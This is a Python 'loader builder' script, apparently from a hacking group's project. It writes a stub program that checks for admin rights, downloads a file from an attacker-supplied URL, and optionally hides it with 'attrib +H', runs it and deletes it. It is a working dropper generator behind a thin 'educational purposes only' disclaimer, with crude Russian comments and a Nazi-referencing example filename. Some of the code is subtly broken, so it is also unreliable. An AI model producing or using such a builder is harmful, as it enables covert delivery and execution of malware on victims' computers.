# Builded by Ametero for Ametero Project
# Version : v0.1

import os
import time
from colorama import init
from colorama import Fore, Style
init()


def print_error(message):
    print(Fore.RED + message)
    print(Style.RESET_ALL)

print("""
I, the creator, am not responsible for any actions, and or damages, caused by this software.

You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only.

This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.

By using this software, you automatically agree to the above.
""")
time.sleep(5)

print("Loader Builder by Ametero(z)")
print("[1] Build a loader")
Zlatrotor = input("Select: ") #Ну тип Златротор смешно не могу (Я просто конченный долбаёб, забейте хуй)
if Zlatrotor == "1":
    print("Select a type of loader:")
    print("[1] Just loader (Without mask)")
    typeselect = input("Select: ")
    if typeselect == "1":
        url_no_mask = input("Enter a URL of downloading file (Need a direct download link) : ")
        fp = open('stub.py', 'w')
        fp.write('from tkinter import messagebox as mb\n')
        fp.write('# Used Loader Builder by Ametero for Ametero Project\n')
        fp.write('# https://t.me/ametero_project\n')
        fp.write("import os\n")
        fp.write("from urllib import request\n")
        fp.write("from urllib3 import PoolManager\n")
        fp.write("url = '"+ url_no_mask + "'\n")
        fp.write("import ctypes\n")
        fp.write("def isAdmin():\n")
        fp.write("  try:\n")
        fp.write("      is_admin = (os.getuid() == 0)\n")
        fp.write("  except AttributeError:\n")
        fp.write("       is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0\n")
        fp.write("       return is_admin\n")
        fp.write("def internet_on():\n")
        fp.write("  try:\n")
        fp.write("      request.urlopen('https://google.com', timeout=7)\n")
        fp.write("      return True\n")
        fp.write("  except request.URLError as err: \n")
        fp.write("      return False\n")
        fp.write("if isAdmin():\n")
        fp.write("    if internet_on() == True:\n")
        print("Please name a donwloaded file (Use a only download file format): (Example: NSDAP.exe)")
        filename = input("Name: ")
        fp.write("          filename = '" + filename + "'\n")
        fp.write("          http = PoolManager()\n")
        fp.write("          response = http.request('GET', url)\n")
        fp.write("          image_data = response.data\n")
        fp.write("          with open(filename, 'wb') as file:\n")
        fp.write("               file.write(image_data)\n")
        print("Start downloaded file on exit of script?")
        print("[1] Yes \n [2] No")
        autostart = input("Select: ")
        print("Hide a downloaded file?")
        print("[1] Yes \n [2] No")
        autohide = input("Select: ")
        print("Delete downloaded file on exit of script?")
        print("[1] Yes \n [2] No")
        suicide = input("Select: ")
        if autohide == "1":
            fp.write('               os.system("attrib +H "+ filename)\n')
        elif autohide == "2":
            pass
        else:
            print_error("Incorrect Input")
        if autostart == "1":
            fp.write('               os.system(filename)\n')
        elif autostart == "2":
            pass
        else:
            print_error("Incorrect Input")
        if suicide == "1":
            fp.write('               os.remove(filename)\n')
        elif suicide == "2":
            pass
        else:
            print_error("Incorrect Input")
        fp.write("    else:\n")
        fp.write("     mb.showerror('Error!', 'Please connect to internet')\n")
        fp.write("else:\n")
        fp.write(" mb.showerror('Error!', 'Please start with admin permission')\n")
        fp.close
        print("Well done!")
        print("Say 'Hi!' to  Ulyana)")
        print("Ulyana : Hi!")
        Ulyana = input("Say: ") # Выходная Ульяна привествует гениуса, звучит мило))
    else:
        print_error("Incorrect Input")

else:
    print_error("Incorrect Input")
    time.sleep(5)
